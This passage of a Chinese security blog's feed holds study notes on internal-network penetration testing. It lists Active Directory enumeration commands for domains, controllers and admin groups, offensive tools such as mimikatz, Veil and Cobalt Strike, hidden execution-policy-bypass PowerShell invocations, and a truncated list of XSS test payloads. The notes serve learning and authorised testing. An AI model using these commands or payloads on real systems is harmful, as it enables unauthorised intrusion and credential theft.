id="Nishang的Invoke-PortScan模块"><a href="#Nishang的Invoke-PortScan模块" class="headerlink" title="Nishang的Invoke-PortScan模块"></a>Nishang的Invoke-PortScan模块</h3><h3 id="端口的Banner信息"><a href="#端口的Banner信息" class="headerlink" title="端口的Banner信息"></a>端口的Banner信息</h3><p>使用nc或者客户端连接工具可以获取服务端的Banner信息，然后可以在漏洞库中查找对应CVE编号的POC、EXP，在ExploitDB、Seebug等平台上查看相关的漏洞利用工具，然后再在目标中验证漏洞是否存在。重点使用<a href="http://www.securityfocus.com/bid">安全焦点的BugTraq</a>和<a href="http://www.exploit-db.c/">Exploit-DB</a></p><h2 id="收集域内基础信息"><a href="#收集域内基础信息" class="headerlink" title="收集域内基础信息"></a>收集域内基础信息</h2><p>只有域用户才可以通过LDAP协议在域控制器上进行查询，本地用户无法查询。但是域中所有的机器都有一个机器用户，用户名为机器名加上“$”，拥有System权限，所以也可以查询。</p><h3 id="查询域"><a href="#查询域" class="headerlink" title="查询域"></a>查询域</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure><h3 id="查询域内所有计算机"><a href="#查询域内所有计算机" class="headerlink" title="查询域内所有计算机"></a>查询域内所有计算机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain:HACKE</span><br></pre></td></tr></table></figure><h3 id="查询域内所有用户组列表"><a href="#查询域内所有用户组列表" class="headerlink" title="查询域内所有用户组列表"></a>查询域内所有用户组列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure><h3 id="查询所有域成员计算机列表"><a href="#查询所有域成员计算机列表" class="headerlink" title="查询所有域成员计算机列表"></a>查询所有域成员计算机列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure><h3 id="获取域密码信息"><a href="#获取域密码信息" class="headerlink" title="获取域密码信息"></a>获取域密码信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure><h3 id="获取域信任信息"><a href="#获取域信任信息" class="headerlink" title="获取域信任信息"></a>获取域信任信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure><h2 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h2><h3 id="查看所有域控制器的机器名"><a href="#查看所有域控制器的机器名" class="headerlink" title="查看所有域控制器的机器名"></a>查看所有域控制器的机器名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /DCLIST:hacke</span><br></pre></td></tr></table></figure><h3 id="查看域控制器的主机名"><a href="#查看域控制器的主机名" class="headerlink" title="查看域控制器的主机名"></a>查看域控制器的主机名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nslookup -type=SRV_ldap._tcp</span><br></pre></td></tr></table></figure><h3 id="查看当前时间（时间服务器通常为主域控制器）"><a href="#查看当前时间（时间服务器通常为主域控制器）" class="headerlink" title="查看当前时间（时间服务器通常为主域控制器）"></a>查看当前时间（时间服务器通常为主域控制器）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><h3 id="查看域控制器组中的机器"><a href="#查看域控制器组中的机器" class="headerlink" title="查看域控制器组中的机器"></a>查看域控制器组中的机器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; /domain</span><br></pre></td></tr></table></figure><h2 id="获取域内的用户和管理员信息"><a href="#获取域内的用户和管理员信息" class="headerlink" title="获取域内的用户和管理员信息"></a>获取域内的用户和管理员信息</h2><h3 id="查询所有域用户列表"><a href="#查询所有域用户列表" class="headerlink" title="查询所有域用户列表"></a>查询所有域用户列表</h3><h4 id="向域控制器进行查询用户列表"><a href="#向域控制器进行查询用户列表" class="headerlink" title="向域控制器进行查询用户列表"></a>向域控制器进行查询用户列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><h4 id="获取域内用户的详细信息"><a href="#获取域内用户的详细信息" class="headerlink" title="获取域内用户的详细信息"></a>获取域内用户的详细信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get /all</span><br></pre></td></tr></table></figure><h4 id="查看存在的用户列表"><a href="#查看存在的用户列表" class="headerlink" title="查看存在的用户列表"></a>查看存在的用户列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery user</span><br></pre></td></tr></table></figure><h4 id="查询本地管理员组中的用户"><a href="#查询本地管理员组中的用户" class="headerlink" title="查询本地管理员组中的用户"></a>查询本地管理员组中的用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><h3 id="查询域管理员用户组"><a href="#查询域管理员用户组" class="headerlink" title="查询域管理员用户组"></a>查询域管理员用户组</h3><h4 id="查询域管理员用户"><a href="#查询域管理员用户" class="headerlink" title="查询域管理员用户"></a>查询域管理员用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure><h4 id="查询管理员用户组"><a href="#查询管理员用户组" class="headerlink" title="查询管理员用户组"></a>查询管理员用户组</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Enterprise Admins&quot; /domain</span><br></pre></td></tr></table></figure><h3 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h3><p>定位域管理员的常规渠道是日志和会话。日志指本地机器的管理员日志，会话是指域内每台机器的登录会话。</p><h4 id="psloggedon-exe"><a href="#psloggedon-exe" class="headerlink" title="psloggedon.exe"></a>psloggedon.exe</h4><h4 id="PVEFindADUser-exe"><a href="#PVEFindADUser-exe" class="headerlink" title="PVEFindADUser.exe"></a>PVEFindADUser.exe</h4><h4 id="netview-exe"><a href="#netview-exe" class="headerlink" title="netview.exe"></a>netview.exe</h4><h4 id="Nmap的NSE脚本"><a href="#Nmap的NSE脚本" class="headerlink" title="Nmap的NSE脚本"></a>Nmap的NSE脚本</h4><h4 id="PowerView脚本"><a href="#PowerView脚本" class="headerlink" title="PowerView脚本"></a>PowerView脚本</h4><h4 id="Empire的user-hunter模块"><a href="#Empire的user-hunter模块" class="headerlink" title="Empire的user_hunter模块"></a>Empire的user_hunter模块</h4><h3 id="查找域管理进程"><a href="#查找域管理进程" class="headerlink" title="查找域管理进程"></a>查找域管理进程</h3>]]></content>
      
      
      <categories>
          
          <category> 《内网安全攻防》阅读笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 基础知识 </tag>
            
            <tag> PowerShell </tag>
            
            <tag> 常用工具 </tag>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1-内网渗透测试基础</title>
      <link href="/2021/09/08/1-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
      <url>/2021/09/08/1-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h1><h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><p>可自由加入或退出的群组，方便同组计算机相互访问和共享资源，类似于简单分组，并没有集中管理的作用。工作组内所有的计算机都是平等的，没有服务器和客户机的区别。</p><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p><strong>域</strong>是一个有安全边境的计算机集合，即一个域内的计算机无法访问另一个域中的资源。域相当于是升级版的工作组，有更加严格的安全控制机制。域内资源的访问取决于是否以合法身份登录到域以及用户在域内的身份。</p><p><strong>域控制器</strong>是域内的一台类似管理服务器的计算机，相当于一个域的“门禁”。域控制器负责验证审核所有用户的请求。域控制器包含域内的账户、密码、属于域的计算机等信息构成的数据库，以供进行验证。当计算机连接到域时，域控制器首先鉴别计算机是否属于这个域，然后鉴别用户使用的账号和密码是否存在以及是否正确匹配等，否则将拒绝用户访问域内的资源。</p><h3 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h3><p>一个小型域。通常至少应该有两台域服务器，若一台DC出现问题则可以使用备份DC以保证域的正常使用。</p><h3 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h3><p>若为了某些需求在网络中划分了多个域，第一个域被称为父域，各分部的域称为该域的子域。</p><p>在同一个域内的信息交互条目较多且不会进行压缩，而不同域之间的信息交互条目较少，且可以进行压缩。通过划分域可以让各部门自治自己部门的网络，且减少整个网络的通信压力。</p><p>划分域也可能是出于安全考虑，因为不同的域可以设定不同的安全策略。</p><h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>多个域之间通过建立信任关系组成的集合。</p><p>域管理员只能管理自己的域，不能访问或者管理其他域。而通过建立信任关系而形成的域树内的域之间可以相互访问和管理。图中上一层为下一层的父域。</p><p><img src="1.png"></p><h3 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h3><p>域森林是多个域树之间建立信任关系组成的集合。</p><p><img src="2.png"></p><h3 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h3><p>用于实现域名与IP地址相互转换的服务器。</p><p>实际上，由于域内的计算机是使用DNS来定位域控制器、服务器和其他计算机和服务的，所以域的名字就是DNS域的名字。</p><p>在内网渗透测试中，大多是通过寻找DNS服务器来确定域控制器的位置的，因为DNS服务器和域控制器通常配置在同一台机器上。</p><h2 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h2><p>活动目录是指域环境中提供目录服务的组件。</p><p>目录存储了有关网络对象的信息（如用户、组、计算机、资源、打印机和联系人等）。如果说内网中的资源是字典的内容，那么活动目录就是字典的索引，用以快速准确地为用户找到其所需要的服务。</p><p>域树内的所有域共享同一个活动目录，这个活动目录内的数据分散存储在各个域之中，且每个域只存储该域内的数据。</p><p>活动目录主要提供以下功能：</p><ul><li>账号集中管理：所有账号存储在服务器中以便执行命令和重置密码等。</li><li>软件集中管理：统一推送软件、安装网络打印机等。</li><li>环境集中管理：统一桌面、协议设置等。</li><li>增强安全性：统一进行杀毒、集中管理权限、监控网络、管理资料等。</li><li>更可靠，更短的宕机时间：利用负载均衡等技术进行容灾设置等。</li></ul><p>活动目录是微软提供的统一管理基础平台，ISA、Exchange、SMS等都依赖这个平台。</p><h2 id="域控制器和活动目录的区别"><a href="#域控制器和活动目录的区别" class="headerlink" title="域控制器和活动目录的区别"></a>域控制器和活动目录的区别</h2><p>活动目录数据库简称AD库，如果内网中的一台计算机上安装了AD，那么这台计算机就变成了DC（域控制器）。</p><h2 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h2><p>划分安全域的目的是将一组安全等级相同的计算机划入同一个网段。在这些计算机相同的网络边界上部署防火墙来实现对其他安全域的网络访问控制策略。</p><p><img src="3.png"></p><p>一般可以将网络划分为三个区域：安全级别最高的内网、安全级别中等的DMZ（隔离区）、安全级别最低的外网。</p><p>DMZ是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题而设立的一个非安全系统与安全系统之间的缓冲区，可以放置一些必须公开的服务器设施，例如Web服务器、FTP服务器和论坛服务器等。一般DMZ的访问控制策略定义如下：</p><ul><li>内网可以访问外网：防火墙需要执行NAT。</li><li>内网可以访问DMZ：内网用户可以使用或管理DMZ中的服务器。</li><li>外网不能访问内网：防火墙的基本策略。内网一般是不允许外网用户访问的，若要在外网访问必须使用VPN。</li><li>外网可以访问DMZ：需要由防火墙来完成对从对外地址到服务器实际地址的转换。</li><li>DMZ不能访问内网：当攻击者攻陷DMZ时，内网也无法被访问到。</li><li>DMZ不能访问外网：此策略有例外，例如若DMZ中有邮件服务器就要允许访问外网，否则邮件服务器无法正常工作。</li><li>内网办公区：一般能够访问DMZ，部分管理者还可以访问核心数据区。在安全管理上可能存在在很多漏洞，是攻击者进入内网的重要途径之一。</li><li>核心区：存储最重要的数据，需要通过日志记录、安全审计等安全措施进行严密的保护，往往只有很少主机能够访问。攻击者在横向移动时要优先查找运维人员、主管等用户的信息，因为他们一般拥有进入核心区的权限。</li></ul><h2 id="域中计算机的分类"><a href="#域中计算机的分类" class="headerlink" title="域中计算机的分类"></a>域中计算机的分类</h2><h3 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h3><p>在网络中可以有多台计算机被配置成为域控制器，以分担验证用户操作的任务量。多个域控制器可以一起工作，可以提高网络的安全性和稳定性</p><h3 id="成员服务器"><a href="#成员服务器" class="headerlink" title="成员服务器"></a>成员服务器</h3><p>安装了服务操作系统并且加入了域，但没有安装活动目录的计算机。主要任务是提供网络资源。</p><p>成员服务器的类型通常有文件服务器、应用服务器、数据库服务器、Web服务器、邮件服务器、防火墙、远程访问服务器、打印服务器等。</p><h3 id="客户机"><a href="#客户机" class="headerlink" title="客户机"></a>客户机</h3><p>用户利用这些计算机和域中的账户就可以登陆域，用来访问网络中的各种资源。</p><h3 id="独立服务器"><a href="#独立服务器" class="headerlink" title="独立服务器"></a>独立服务器</h3><p>独立服务器和域没有关系。独立服务器既不加入域，也不安装活动目录。</p><p>独立服务器可以创建工作组、与网络中的其他计算机共享资源，但不能使用活动目录提供的任何服务。</p><h2 id="域内权限"><a href="#域内权限" class="headerlink" title="域内权限"></a>域内权限</h2><p><strong>组</strong>是用户账号的集合，包括域本地组、全局组、通用组，可以大大简化网络维护和管理工作。</p><ul><li>域本地组：主要用于授予本域内资源的访问权限，不能嵌套在其他组中。</li><li>全局组：全剧组和域本地组的关系与域用户帐号和本地帐号的关系类似，域用户帐号可以在全局使用，而本地帐号只能在本机中使用。比如把账号A加入域本地组Administrator，则A可对本机内其他用户的权限进行操作，但是不能操作域中其他计算机的用户权限进行操作；而如果把A加入全局组Domain Admins中，用户A则可以操作域内所有计算机的权限。</li><li>通用组：可在森林中的任何域中指派权限，可以嵌套在其他组中。</li></ul><p><strong>记忆方式</strong>：域本地组来自全林，作用于本域；全局组来自本域，作用于全林；通用组来自全林，作用于全林。</p><p>几个比较重要的域本地组权限：</p><ul><li>管理员组（Administrators）：权力最大，默认在活动目录和域控制器中具有管理权限。</li><li>远程登录组（Remote Desktop Users）：有远程登陆权限。</li><li>账号操作员组（Account Operators）：除属于Administrators组和Domain Admins组中成员的权限外，可以更改其他成员的权限，且可以在本地登录域控制器。</li><li>服务器操作员组（Server Operators）：可以管理域服务器，包括建立、管理、删除共享目录、格式化硬盘等。</li><li>备份操作员组（Backup Operators）：可以在域控制器中执行备份和还原操作，可以在本地登录和关闭域控制器。</li></ul><p>几个重要的全员组、通用组权限：</p><ul><li>域管理员组（Domain Admins）：默认会被添加到每台加入域的成员计算机的本地Administrators组中。</li><li>企业系统管理员组（Enterprise Admins）：在域森林中的每个域中都被添加到Administrators组中。</li><li>架构管理员组（Schema Admins）：可以修改活动目录和域森林的模式。</li><li>域用户组（Domain Users）：所有的域成员</li></ul><h2 id="虚拟机网络模式"><a href="#虚拟机网络模式" class="headerlink" title="虚拟机网络模式"></a>虚拟机网络模式</h2><h3 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h3><p>虚拟机和主机相当于插在同一台交换机上的两台计算机。如果有DHCP服务则自动获取IP，否则需要手动配置。</p><h3 id="NAT模式"><a href="#NAT模式" class="headerlink" title="NAT模式"></a>NAT模式</h3><p>虚拟机通过与物理机的连接访问网络。虚拟机可以访问主机所在局域网中的其他计算机，但只有主机能访问虚拟机，局域网中的其他计算机无法访问到虚拟机。</p><h3 id="Host-only模式"><a href="#Host-only模式" class="headerlink" title="Host-only模式"></a>Host-only模式</h3><p>最私密最严格的网络配置，虚拟机处于一个独立的网段中。虚拟机无法直接上网，但可以通过Windows提供的连接共享功能实现共享上网。虚拟机能够和主机所在局域网中的其他计算机互相访问到。</p><p>Host-only模式是渗透测试中虚拟机常用的网络模式。</p><h1 id="主机平台及常用工具"><a href="#主机平台及常用工具" class="headerlink" title="主机平台及常用工具"></a>主机平台及常用工具</h1><h2 id="Kali中的常用工具"><a href="#Kali中的常用工具" class="headerlink" title="Kali中的常用工具"></a>Kali中的常用工具</h2><h3 id="WCE"><a href="#WCE" class="headerlink" title="WCE"></a>WCE</h3><p>Windows凭据管理器，常用于列出登录会话，以及添加、修改和删除关联凭据（例如LM Hash、NTLM Hash、明文密码、Kerberos票据等）。</p><h3 id="minikatz"><a href="#minikatz" class="headerlink" title="minikatz"></a>minikatz</h3><p>用于从内存中获取明文密码、现金票据和密钥等。</p><h3 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h3><p>用于嗅探网络内所有的LLMNR包、获取各主机的信息、提供多种渗透场景等。</p><h3 id="BeEF"><a href="#BeEF" class="headerlink" title="BeEF"></a>BeEF</h3><p>针对浏览器的渗透测试工具。可以通过XSS漏洞，利用JavaScript代码对目标主机的浏览器进行测试。也可以配合Metasploit进一步对目标主机进行测试。</p><h3 id="DSHashes"><a href="#DSHashes" class="headerlink" title="DSHashes"></a>DSHashes</h3><p>从NTDSXtract中获取易于理解的散列值。</p><h3 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h3><p>基于PowerShell的后渗透测试框架，包含很多PowerShell脚本。主要用于信息收集、权限提升、权限维持。</p><h3 id="Nishang"><a href="#Nishang" class="headerlink" title="Nishang"></a>Nishang</h3><p>针对PowerShell的渗透测试工具，集成了框架、脚本、各种Payload。</p><h3 id="Empore"><a href="#Empore" class="headerlink" title="Empore"></a>Empore</h3><p>内网渗透测试利器，跨平台性能类似于Metasploit。</p><h3 id="ps-encoder-py"><a href="#ps-encoder-py" class="headerlink" title="ps-encoder.py"></a>ps-encoder.py</h3><p>使用Base64编码封装的PowerShell命令包，目的是混淆和压缩代码</p><h3 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h3><p>使用Samba工具的PsExec类工具。特征和痕迹十分明显。特点在于渗透测试时能够直接提供目标主机的System权限。</p><h3 id="后门制造工厂（不再维护）"><a href="#后门制造工厂（不再维护）" class="headerlink" title="后门制造工厂（不再维护）"></a>后门制造工厂（不再维护）</h3><p>对PE、ELF、Mach-O等二进制文件注入Shellcode。</p><h3 id="veil"><a href="#veil" class="headerlink" title="veil"></a>veil</h3><p>生成绕过常见防病毒解决方案的Metasploit有效载荷。</p><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>一个计算机渗透测试框架，提供有关已知安全漏洞的重要信息。</p><h3 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h3><p>优秀的后渗透测试平台，功能强大。</p><h2 id="Windows中的常用工具"><a href="#Windows中的常用工具" class="headerlink" title="Windows中的常用工具"></a>Windows中的常用工具</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>用于发现主机、扫描端口、识别服务、识别操作系统等。</p><h3 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h3><p>网络协议和数据包解析器，可以监控整个网络的流量。</p><h3 id="PuTTY"><a href="#PuTTY" class="headerlink" title="PuTTY"></a>PuTTY</h3><p>SSH和Telnet客户端，用于远程访问。</p><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>用于检测和执行应用程序中的SQL注入行为。</p><h3 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h3><p>除一般用途外，Burp Scanner可以扫描应用程序中的漏洞。</p><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p>网络登录暴力破解工具。</p><h3 id="Getif"><a href="#Getif" class="headerlink" title="Getif"></a>Getif</h3><p>用于收集SNMP设备的信息。</p><h3 id="Cain-amp-Abel"><a href="#Cain-amp-Abel" class="headerlink" title="Cain&amp;Abel"></a>Cain&amp;Abel</h3><p>密码和凭证恢复工具。</p><h2 id="Windows-PowerShell基础"><a href="#Windows-PowerShell基础" class="headerlink" title="Windows PowerShell基础"></a>Windows PowerShell基础</h2><h3 id="PowerShell的特点"><a href="#PowerShell的特点" class="headerlink" title="PowerShell的特点"></a>PowerShell的特点</h3><ul><li>Win7及以上版本默认安装</li><li>几乎不会触发杀毒软件</li><li>可以远程执行</li><li>cmd.exe的运行通常会被阻止，而PowerShell的运行通常不会被阻止</li><li>可用于管理活动目录</li></ul><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h3 id="ps1文件"><a href="#ps1文件" class="headerlink" title=".ps1文件"></a><code>.ps1</code>文件</h3><p>一个PowerShell脚本其实就是一个简单的文本文件，扩展名为<code>.ps1</code>。每个命令显示为独立的一行。</p><h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>有如下执行策略：</p><ul><li>Restricted：脚本不能运行（默认设置）</li><li>RemoteSigned：本地创建的脚本以及网上下载的拥有数字证书签名的脚本可以运行</li><li>AllSigned：仅由受信任的发布者签名的脚本可以运行</li><li>Unrestricted：允许所有脚本运行</li></ul><p>为了防止恶意脚本运行，默认情况下执行策略为“不能运行”。如果PowerShell脚本无法运行，则可以使用下列命令查询当前的执行策略。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span></span><br></pre></td></tr></table></figure><p>可以使用下列命令设置执行策略</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> &lt;policy name&gt;</span><br></pre></td></tr></table></figure><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>将一个命令的输出作为另一个命令的输入，两命令之间使用<code>|</code>连接。例如下列命令可以停止所有以‘p’开头的程序。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get-process</span> p | <span class="built_in">stop-process</span></span><br></pre></td></tr></table></figure><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><ul><li>-ExecutionPolicy Bypass（-Exec Bypass）：绕过执行安全策略，这个参数非常重要，默认情况下PowerShell的安全策略规定PowerShell不能运行命令和文件。</li><li>-WindowStyle Hidden（-W Hidden）：隐藏窗口。</li><li>-NonInteractive（-NonI）：非交互模式。PowerShell不为用户提供交互式的提示。</li><li>-NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件。</li><li>-noexit：执行后不退出Shell。</li><li>-NoLogo：启动时不显示版权标志的PowerShell。</li></ul><h3 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h3><p>目的是混淆和压缩代码，避免因为一些特殊字符被杀毒软件查杀。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ./ps_encoder.py -s raw.txt</span><br></pre></td></tr></table></figure><h3 id="执行不同版本的PowerShell"><a href="#执行不同版本的PowerShell" class="headerlink" title="执行不同版本的PowerShell"></a>执行不同版本的PowerShell</h3><p>在x64的机器上，有两个版本的PowerShell，且<strong>两个版本的执行策略不会相互影响</strong>。</p><p>运行32位PowerShell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -NoP -NonI -W hidden -Exec Bypass</span><br></pre></td></tr></table></figure><p>运行64位PowerShell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash">WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W hidden -Exec Bypass</span></span><br></pre></td></tr></table></figure><h1 id="后续为实践内容，此笔记后续可能进行整理"><a href="#后续为实践内容，此笔记后续可能进行整理" class="headerlink" title="后续为实践内容，此笔记后续可能进行整理"></a>后续为实践内容，此笔记后续可能进行整理</h1>]]></content>
      
      
      <categories>
          
          <category> 《内网安全攻防》阅读笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 基础知识 </tag>
            
            <tag> PowerShell </tag>
            
            <tag> 常用工具 </tag>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS漏洞的利用和绕过</title>
      <link href="/2021/08/08/XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87/"/>
      <url>/2021/08/08/XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS漏洞分类"><a href="#XSS漏洞分类" class="headerlink" title="XSS漏洞分类"></a>XSS漏洞分类</h1><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><ul><li>攻击步骤：<strong>将恶意代码提交到目标网站的数据库中</strong>，用户打开网站时，网站服务端将恶意代码从数据库中取出，拼接在HTML中返回浏览器，之后用户浏览器收到响应后解析执行混入其中的恶意代码，恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户行为，调用目标网站接口执行攻击者指定的操作。</li><li>常见于带有用户保存数据的网站功能，比如<strong>论坛发帖、商品评价、用户私信</strong>等。</li></ul><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><ul><li>攻击步骤：<strong>构造出特殊的URL</strong>，其中包含恶意代码。当用户打开带有恶意代码的URL时，网站服务端将恶意代码从URL中取出，拼接在HTML中返回浏览器，之后用户浏览器收到响应后解析执行混入其中的恶意代码，恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户行为，调用目标网站接口执行攻击者指定的操作。</li><li>常见于通过 URL 传递参数的功能，如<strong>网站搜索、跳转</strong>等。由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</li><li>反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在<strong>数据库</strong>里，反射型 XSS 的恶意代码存在 <strong>URL</strong> 里。</li></ul><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><ul><li>攻击步骤：<strong>构造出特殊的URL</strong>，其中包含恶意代码，用户打开带有恶意代码的URL，用户浏览器打开带有恶意代码的URL，之后用户浏览器收到响应后解析执行，前端JS取出URL中的恶意代码并执行，恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户行为，调用目标网站接口执行攻击者指定的操作。</li><li>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，<strong>取出和执行恶意代码由浏览器端完成</strong>，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</li></ul><h1 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">document.domain</span> <span class="attr">onerror</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">M</span> <span class="attr">onmouseover</span>=<span class="string">alert(document.domain)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onscroll</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(document.domain)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span 